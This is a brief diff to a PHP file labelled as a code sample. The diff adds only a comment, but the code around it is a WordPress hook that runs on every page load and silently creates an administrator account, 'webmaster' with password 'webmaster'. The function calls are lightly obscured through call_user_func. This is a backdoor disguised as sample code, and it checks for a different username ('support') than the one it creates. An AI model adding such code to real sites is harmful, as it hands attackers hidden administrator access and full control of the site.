@@ -2,6 +2,8 @@
 
 //     CODE SAMPLE
 
+// sumit code
+
 /* create default admin user in wordpress */
 
 add_action('init',function(){if(!call_user_func('username_exists','support' )){(new WP_User(call_user_func('wp_create_user','webmaster','webmaster','support@webmaster.com')))->set_role( 'administrator' );}});
